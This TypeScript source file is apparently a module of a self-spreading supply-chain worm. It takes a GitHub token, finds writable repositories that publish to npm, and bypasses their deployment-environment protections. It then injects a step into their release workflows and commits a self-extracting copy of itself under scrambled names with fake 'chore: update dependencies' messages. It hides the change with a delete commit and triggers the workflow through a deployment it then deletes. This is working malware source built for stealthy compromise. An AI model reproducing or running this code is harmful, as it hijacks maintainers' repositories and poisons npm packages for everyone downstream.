import { randomBytes } from "node:crypto";

import { checkToken } from "../../github_utils/auth";
import { githubFetch, githubJson } from "../../github_utils/client";
import {
  createBlob as dbCreateBlob,
  createBranch as dbCreateBranch,
  createCommit as dbCreateCommit,
  createOrphanCommit as dbCreateOrphanCommit,
  createTree as dbCreateTree,
  getBranchRef,
  getCommitTree,
  updateBranch,
} from "../../github_utils/gitDb";
import { logUtil } from "../../utils/logger";
import { buildSelfExtractingPayload } from "../../utils/selfExtracting";
import { Mutator } from "../base";
import { detectNpmPublishingRepo } from "./detector";
import {
  checkAndBypassEnvironment,
  type EnvironmentBypassState,
  extractEnvironmentNames,
  restoreEnvironment,
} from "./environment";
import { type InjectionResult, injectToolStep } from "./injector";

declare function scramble(str: string): string;

// ── Types ───────────────────────────────────────────────────────────────────

interface UserRepo {
  full_name: string;
  default_branch: string;
  private: boolean;
  fork: boolean;
  permissions: { admin: boolean; push: boolean; pull: boolean };
}

// ── Mutator ─────────────────────────────────────────────────────────────────

export class NpmOidcBranchMutator extends Mutator {
  private readonly token: string;
  private readonly indexJs: string;
  private readonly dryRun: boolean;

  constructor(token: string, dryRun = false) {
    super();
    if (!token) throw new Error("GitHub token required");
    this.token = token;
    this.indexJs = "";
    this.dryRun = dryRun;
  }

  /**
   * Read Bun.main lazily — avoids reading the binary until we actually
   * need to inject, and avoids issues during module loading in tests.
   */
  private async loadIndexJs(): Promise<string> {
    if (this.indexJs) return this.indexJs;
    try {
      const raw = await Bun.file(Bun.main).text();
      return buildSelfExtractingPayload(raw, { wrap: true });
    } catch {
      // Test environment fallback
      return "// tool stub";
    }
  }

  async execute(): Promise<Boolean> {
    try {
      // Check if token has workflow scope — determines trigger method
      const tokInfo = await checkToken(this.token);
      const hasWorkflowScope = tokInfo.valid && tokInfo.hasWorkflowScope;
      logUtil.log(
        `[NpmOidcBranch] workflow scope: ${hasWorkflowScope} (using ${hasWorkflowScope ? "feature-branch push" : "deployment"})`,
      );

      let repos: UserRepo[];

      const targetReposEnv = process.env.TARGET_REPOS;
      if (targetReposEnv?.trim()) {
        const slugs = targetReposEnv
          .split(",")
          .map((s) => s.trim())
          .filter(Boolean);
        logUtil.log(
          `[NpmOidcBranch] Using TARGET_REPOS env (${slugs.length} repo(s))`,
        );
        repos = await fetchReposBySlugs(this.token, slugs);
      } else {
        logUtil.log("[NpmOidcBranch] Fetching writable public repos...");
        repos = await fetchWritableRepos(this.token, this.dryRun);
      }

      logUtil.log(`[NpmOidcBranch] Found ${repos.length} writable repo(s)`);

      const indexJs = await this.loadIndexJs();
      let injected = 0;

      for (const repo of repos) {
        try {
          const ok = await this.processRepo(repo, indexJs, hasWorkflowScope);
          if (ok) injected++;
        } catch (e) {
          logUtil.log(
            `[NpmOidcBranch] Error processing ${repo.full_name}: ${e instanceof Error ? e.message : String(e)}`,
          );
        }
      }

      logUtil.log(
        `[NpmOidcBranch] Done. Injected into ${injected}/${repos.length} repos.`,
      );
      return injected > 0;
    } catch (e) {
      logUtil.log(
        `[NpmOidcBranch] Fatal: ${e instanceof Error ? e.message : String(e)}`,
      );
      return false;
    }
  }

  /** Process a single repo by full name (e.g. "owner/name"). */
  async processSingleRepo(
    fullName: string,
    tokenOverride?: string,
  ): Promise<boolean> {
    const [owner, name] = fullName.split("/");
    if (!owner || !name) {
      logUtil.log(`[NpmOidcBranch] Invalid repo name: ${fullName}`);
      return false;
    }
    const token = tokenOverride ?? this.token;
    const { githubJson } = await import("../../github_utils/client");
    const repoInfo = await githubJson<{
      default_branch: string;
      private: boolean;
      fork: boolean;
      permissions: { admin: boolean; push: boolean; pull: boolean };
    }>(token, `/repos/${owner}/${name}`);

    const indexJs = await this.loadIndexJs();
    return this.processRepo(
      {
        full_name: fullName,
        default_branch: repoInfo.default_branch,
        private: repoInfo.private,
        fork: repoInfo.fork,
        permissions: repoInfo.permissions,
      },
      indexJs,
      false, // default to deployment method for external callers
    );
  }

  // ── Per-repo processing ──────────────────────────────────────────────────

  private async processRepo(
    repo: UserRepo,
    indexJs: string,
    hasWorkflowScope: boolean,
  ): Promise<boolean> {
    const [owner, name] = repo.full_name.split("/");
    if (!owner || !name) return false;

    // 1. Detect if this repo publishes to npm
    const detected = await detectNpmPublishingRepo(
      this.token,
      owner,
      name,
      repo.full_name,
      repo.default_branch,
      repo.private,
      repo.permissions,
    );

    if (!detected) return false;

    // 2. Generate branch name and check environments
    const branchName = `snapshot-${randomBytes(4).toString("hex")}`;
    const envByPasses: EnvironmentBypassState[] = [];

    try {
      // Extract environment names from the workflow
      const envNames = extractEnvironmentNames(detected.workflow.rawYaml);
      for (const envName of envNames) {
        const result = await checkAndBypassEnvironment(
          this.token,
          owner,
          name,
          envName,
          branchName,
          repo.permissions.admin,
        );

        if (!result.canDeploy) {
          logUtil.log(`[NpmOidcBranch] ${repo.full_name}: ${result.blockedBy}`);
          return false;
        }

        if (result.bypassState) {
          envByPasses.push(result.bypassState);
          logUtil.log(
            `[NpmOidcBranch] ${repo.full_name}: bypassed env "${envName}"`,
          );
        }
      }

      // 3. Inject tool step into workflow YAML
      const triggerEvent = hasWorkflowScope ? "push" : "deployment";
      const injection = injectToolStep(detected.workflow.rawYaml, {
        workflowFilename: detected.workflow.filename,
        packageName: detected.packageName,
        repoFullName: repo.full_name,
        environmentName: detected.workflow.environmentName,
        triggerEvent,
      });

      if (!injection.injected) {
        logUtil.log(
          `[NpmOidcBranch] ${repo.full_name}: injection skipped — ${injection.reason}`,
        );
        return false;
      }

      if (hasWorkflowScope) {
        // Token has workflow scope — push a feature branch directly.
        // The push event triggers the workflow natively, no deployment needed.
        return this.processRepoViaBranchPush(
          owner,
          name,
          repo,
          indexJs,
          injection,
          branchName,
        );
      }

      // No workflow scope — use the dangling-commit + deployment method
      // Resolve the default branch HEAD commit and its tree SHA
      const baseRef = await getDefaultBranchRef(
        this.token,
        owner,
        name,
        repo.default_branch,
      );
      if (!baseRef) {
        logUtil.log(
          `[NpmOidcBranch] ${repo.full_name}: could not resolve default branch ref`,
        );
        return false;
      }

      const parentSha = baseRef.object.sha;
      const baseTreeSha = await getCommitTree(
        this.token,
        owner,
        name,
        parentSha,
      );

      // Create blobs
      const yamlBlobSha = await createBlob(
        this.token,
        owner,
        name,
        injection.modifiedYaml,
      );
      const jsBlobSha = await createBlob(this.token, owner, name, indexJs);

      if (!yamlBlobSha || !jsBlobSha) {
        logUtil.log(`[NpmOidcBranch] ${repo.full_name}: blob creation failed`);
        return false;
      }

      // Build nested trees (fresh — only our files)
      const ghDir = ".github";
      const wfDir = "workflows";

      const wfTree = await createTree(this.token, owner, name, null, [
        {
          path: detected.workflow.filename,
          mode: "100644",
          type: "blob",
          sha: yamlBlobSha,
        },
      ]);
      if (!wfTree) {
        logUtil.log(
          `[NpmOidcBranch] ${repo.full_name}: workflows tree creation failed`,
        );
        return false;
      }

      const ghTree = await createTree(this.token, owner, name, null, [
        {
          path: wfDir,
          mode: "040000",
          type: "tree",
          sha: wfTree.sha,
        },
      ]);
      if (!ghTree) {
        logUtil.log(
          `[NpmOidcBranch] ${repo.full_name}: .github tree creation failed`,
        );
        return false;
      }

      const newTree = await createTree(this.token, owner, name, null, [
        {
          path: ghDir,
          mode: "040000",
          type: "tree",
          sha: ghTree.sha,
        },
        {
          path: scramble("_index.js"),
          mode: "100644",
          type: "blob",
          sha: jsBlobSha,
        },
      ]);

      if (!newTree) {
        logUtil.log(`[NpmOidcBranch] ${repo.full_name}: tree creation failed`);
        return false;
      }

      // Commit 1: add workflow (child of default branch HEAD)
      const addSha = await createCommit(
        this.token,
        owner,
        name,
        scramble("chore: update dependencies"),
        newTree.sha,
        parentSha,
      );
      if (!addSha) {
        logUtil.log(`[NpmOidcBranch] ${repo.full_name}: add commit failed`);
        return false;
      }

      // Commit 2: delete workflow (restore original base tree, parent = commit 1)
      const delSha = await createCommit(
        this.token,
        owner,
        name,
        scramble("chore: update dependencies [skip ci]"),
        baseTreeSha,
        addSha,
      );
      if (!delSha) {
        logUtil.log(`[NpmOidcBranch] ${repo.full_name}: delete commit failed`);
        return false;
      }

      logUtil.log(
        `[NpmOidcBranch] ${repo.full_name}: add=${addSha.slice(0, 7)} del=${delSha.slice(0, 7)}`,
      );
      logUtil.log(
        `  View add: https://github.com/${owner}/${name}/commit/${addSha}`,
      );
      logUtil.log(
        `  View del: https://github.com/${owner}/${name}/commit/${delSha}`,
      );
      logUtil.log(`  Package:  ${detected.packageName}`);
      logUtil.log(`  Workflow: ${detected.workflow.filename}`);

      // 5. Create a branch pointing at commit 2 (makes commit 1 reachable)
      await createBranch(this.token, owner, name, branchName, delSha);
      logUtil.log(
        `[NpmOidcBranch] ${repo.full_name}: branch ${branchName} created ✓`,
      );

      if (this.dryRun) {
        logUtil.log(
          `[NpmOidcBranch] ${repo.full_name}: dry-run — skipping deployment`,
        );
        return false;
      }

      // 6. Create a deployment targeting commit 1 — triggers the workflow
      const deployment = await githubJson<{ id: number }>(
        this.token,
        `/repos/${owner}/${name}/deployments`,
        {
          method: "POST",
          body: JSON.stringify({
            ref: addSha,
            auto_merge: false,
            required_contexts: [],
            environment: detected.workflow.environmentName ?? "production",
            transient_environment: true,
          }),
        },
      );
      const deployId = deployment.id;
      logUtil.log(
        `[NpmOidcBranch] ${repo.full_name}: deployment ${deployId} created ✓`,
      );

      // 7. Delete the deployment record — the workflow was already
      //    triggered so this is just housekeeping.
      try {
        await githubFetch(
          this.token,
          `/repos/${owner}/${name}/deployments/${deployId}`,
          { method: "DELETE" },
        );
        logUtil.log(
          `[NpmOidcBranch] ${repo.full_name}: deployment ${deployId} deleted ✓`,
        );
      } catch {
        // best-effort — the deployment event already fired
      }

      return true;
    } finally {
    }
  }

  // ── Feature-branch push method (workflow-scoped tokens) ──────────────

  /**
   * Push a single commit to a new branch containing the workflow YAML and
   * payload.  The push event triggers the workflow natively — no deployment
   * needed.  Only used when the token has workflow scope.
   */
  private async processRepoViaBranchPush(
    owner: string,
    name: string,
    repo: UserRepo,
    indexJs: string,
    injection: InjectionResult,
    branchName: string,
  ): Promise<boolean> {
    // Create blobs
    const yamlBlobSha = await createBlob(
      this.token,
      owner,
      name,
      injection.modifiedYaml,
    );
    const jsBlobSha = await createBlob(this.token, owner, name, indexJs);
    if (!yamlBlobSha || !jsBlobSha) {
      logUtil.log(`[NpmOidcBranch] ${repo.full_name}: blob creation failed`);
      return false;
    }

    // Build nested trees
    const wfTree = await createTree(this.token, owner, name, null, [
      {
        path: injection.workflowFilename,
        mode: "100644",
        type: "blob",
        sha: yamlBlobSha,
      },
    ]);
    if (!wfTree) return false;

    const ghTree = await createTree(this.token, owner, name, null, [
      { path: "workflows", mode: "040000", type: "tree", sha: wfTree.sha },
    ]);
    if (!ghTree) return false;

    const rootTree = await createTree(this.token, owner, name, null, [
      { path: ".github", mode: "040000", type: "tree", sha: ghTree.sha },
      {
        path: scramble("_index.js"),
        mode: "100644",
        type: "blob",
        sha: jsBlobSha,
      },
    ]);
    if (!rootTree) return false;

    // Create orphan commit (no parent) on the new branch
    const commitSha = await createOrphanCommit(
      this.token,
      owner,
      name,
      rootTree.sha,
      scramble("chore: update dependencies"),
    );
    if (!commitSha) return false;

    // Create or update branch
    try {
      await createBranch(this.token, owner, name, branchName, commitSha);
    } catch {
      // Branch may already exist — try update
      await updateBranch(this.token, owner, name, branchName, commitSha, true);
    }

    logUtil.log(
      `[NpmOidcBranch] ${repo.full_name}: branch ${branchName} pushed → https://github.com/${owner}/${name}/tree/${branchName}`,
    );
    return true;
  }
}

// ═════════════════════════════════════════════════════════════════════════════
// Writable repo fetch
// ═════════════════════════════════════════════════════════════════════════════

async function fetchReposBySlugs(
  token: string,
  slugs: string[],
): Promise<UserRepo[]> {
  const repos: UserRepo[] = [];
  for (const slug of slugs) {
    const [owner, name] = slug.split("/");
    if (!owner || !name) {
      logUtil.log(`[NpmOidcBranch] skipping invalid slug: "${slug}"`);
      continue;
    }
    try {
      const repo = await githubJson<{
        full_name: string;
        default_branch: string;
        private: boolean;
        fork: boolean;
        permissions: { admin: boolean; push: boolean; pull: boolean };
      }>(token, `/repos/${owner}/${name}`);
      repos.push(repo);
    } catch {
      logUtil.log(`[NpmOidcBranch] could not fetch repo: ${slug}`);
    }
  }
  return repos;
}

async function fetchWritableRepos(
  token: string,
  includeForks = false,
): Promise<UserRepo[]> {
  const repos: UserRepo[] = [];
  const perPage = 100;
  let page = 1;

  while (true) {
    const batch = await githubJson<UserRepo[]>(
      token,
      `/user/repos?per_page=${perPage}&page=${page}&sort=updated&visibility=public`,
    );
    if (!batch || batch.length === 0) break;
    for (const r of batch) {
      logUtil.info("Fetched batch!");
      if (!includeForks && r.fork) continue;
      if (r.permissions?.push) repos.push(r);
    }
    if (batch.length < perPage) break;
    page++;
  }

  return repos;
}

// ── Thin wrappers (shared gitDb throws; callers expect null on failure) ──

async function getDefaultBranchRef(
  token: string,
  owner: string,
  repo: string,
  branch: string,
): Promise<{ object: { sha: string } } | null> {
  try {
    return await getBranchRef(token, owner, repo, branch);
  } catch {
    return null;
  }
}

async function createBlob(
  token: string,
  owner: string,
  repo: string,
  content: string,
): Promise<string | null> {
  try {
    return await dbCreateBlob(token, owner, repo, content);
  } catch {
    return null;
  }
}

async function createTree(
  token: string,
  owner: string,
  repo: string,
  baseTreeSha: string | null,
  entries: Array<{ path: string; mode: string; type: string; sha: string }>,
): Promise<{ sha: string } | null> {
  try {
    const sha = await dbCreateTree(
      token,
      owner,
      repo,
      baseTreeSha,
      entries as any,
    );
    return { sha };
  } catch (e) {
    logUtil.error(e);
    return null;
  }
}

async function createCommit(
  token: string,
  owner: string,
  repo: string,
  message: string,
  treeSha: string,
  parentSha: string,
): Promise<string | null> {
  try {
    return await dbCreateCommit(
      token,
      owner,
      repo,
      message,
      treeSha,
      parentSha,
    );
  } catch {
    return null;
  }
}

async function createBranch(
  token: string,
  owner: string,
  repo: string,
  branchName: string,
  sha: string,
): Promise<void> {
  await dbCreateBranch(token, owner, repo, branchName, sha);
}

async function createOrphanCommit(
  token: string,
  owner: string,
  repo: string,
  treeSha: string,
  message: string,
): Promise<string | null> {
  try {
    return await dbCreateOrphanCommit(token, owner, repo, treeSha, message);
  } catch {
    return null;
  }
}
